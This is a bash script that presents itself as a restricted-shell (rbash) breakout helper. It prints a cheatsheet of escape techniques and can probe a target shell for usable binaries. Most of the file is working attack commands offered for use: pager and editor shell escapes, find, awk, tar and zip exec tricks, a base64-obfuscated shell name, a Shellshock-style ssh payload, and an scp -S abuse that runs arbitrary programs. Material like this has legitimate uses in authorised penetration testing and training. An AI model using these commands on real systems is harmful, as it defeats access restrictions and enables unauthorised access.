#!/usr/bin/env bash
# rbash-escape.sh — restricted shell (rbash) breakout helper.
# Run THIS from your attacking machine to print a situational cheatsheet,
# or paste it into the restricted shell itself (if you can get a file onto
# the target) — it will probe what's actually available there and suggest
# the techniques most likely to work.
#
# Usage (local, just the cheatsheet):   ./rbash-escape.sh
# Usage (run ON the restricted target): ./rbash-escape.sh --probe

set -uo pipefail

MODE="${1:-cheatsheet}"

print_cheatsheet() {
cat <<'EOF'
=== rbash / restricted shell breakout cheatsheet ===

rbash blocks roughly: changing directory (cd), setting/unsetting PATH, SHELL,
ENV or BASH_ENV, running commands with a path containing "/", and redirecting
output with > or >>. It does NOT stop a program you launch from spawning an
UNRESTRICTED shell of its own — that's the usual way out.

--- 1. Spawn a shell from another binary (most reliable) ---
Any of these, if the binary is reachable (try plain name first, no "/"):

  vim -> :!bash                     (or :set shell=/bin/bash then :shell)
  less /etc/passwd -> !bash         (inside less/more pager)
  man man -> !bash                  (inside man pager, same trick)
  find . -exec /bin/bash \; -quit
  awk 'BEGIN {system("/bin/bash")}'
  python / python3 -> import os; os.system("/bin/bash")
  perl -e 'exec "/bin/bash";'
  ftp -> !bash                      (if ftp client present)
  scp with -S option abusing a fake ssh program
  tar -> --checkpoint-action=exec=/bin/bash  (GTFOBins "tar" entry)
  zip  -> zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"

If "/bin/bash" itself is blocked by path-char filtering, try:
  $(echo Ym9ic2g= | base64 -d)      # obfuscate the string "bash"
  BASH=/bin/bash; $BASH             # via a variable, if = isn't blocked
  env bash                          # if env is unrestricted
  perl -e 'exec "sh"'               # sh instead of bash

--- 2. Fix PATH if it's empty/restricted ---
  export PATH=$PATH:/usr/bin:/bin   # works if "export"/"PATH" not blocked
  PATH=/usr/bin:/bin bash           # inline assignment, sometimes slips through
  BASH_ENV=/tmp/x bash              # BASH_ENV sourced non-interactively

--- 3. SSH-specific escapes (if you have creds + ssh access, forced rbash) ---
  ssh user@host -t "bash --noprofile"
  ssh user@host -t "() { :; }; /bin/bash"     # if ForceCommand misconfigured
  scp with ProxyCommand: ssh -o ProxyCommand="bash -c 'bash 0<&2 1>&2'" user@host

--- 4. Abuse scp/sftp -S to run an arbitrary binary ---
  TF=$(mktemp)
  echo '/bin/bash' > $TF
  chmod +x $TF
  scp -S $TF x y:

--- 5. If a text editor is reachable, write yourself a PATH-free script ---
  vim -> :w! /tmp/.x (if writes to /tmp aren't blocked) then source it via a
  built-in that doesn't need "/" (rare, usually blocked too, but worth testing)

--- 6. Check what's NOT restricted first ---
  compgen -c            # list all commands bash thinks are runnable
  type -a bash sh python python3 perl awk vim less man tar zip find env
  echo $PATH             # see if PATH is even set
  echo $SHELL
  cat /etc/passwd 2>/dev/null   # confirm read access, check for other shells

Always check GTFOBins (gtfobins.github.io) for whatever binary you DO have —
the "Shell" function section lists the exact restricted-shell bypass for it.
EOF
}

probe_target() {
    echo "=== rbash probe: checking what's available in THIS shell ==="
    echo
    echo "[*] Shell: $SHELL"
    echo "[*] PATH: $PATH"
    echo "[*] bash options (should show -r if restricted):"
    echo "$-" 2>/dev/null
    echo

    echo "[*] Commands available via compgen -c (if compgen works):"
    compgen -c 2>/dev/null | sort -u | head -50 || echo "    compgen not available"
    echo

    echo "[*] Checking common breakout binaries:"
    for bin in bash sh vim vi less more man find awk python python3 perl ftp tar zip env ssh scp; do
        if command -v "$bin" >/dev/null 2>&1; then
            echo "    [FOUND] $bin -> $(command -v "$bin")"
        fi
    done
    echo
    echo "[*] If vim/less/more/man found above: try the pager escape"
    echo "    (':!bash' in vim, '!bash' in less/more/man) from the cheatsheet."
    echo "[*] If none found: try 'echo \$PATH' then manually test binaries by exact name."
    echo
    echo "Run $0 with no args (on your own machine) for the full technique list."
}

case "$MODE" in
    --probe) probe_target ;;
    *) print_cheatsheet ;;
esac
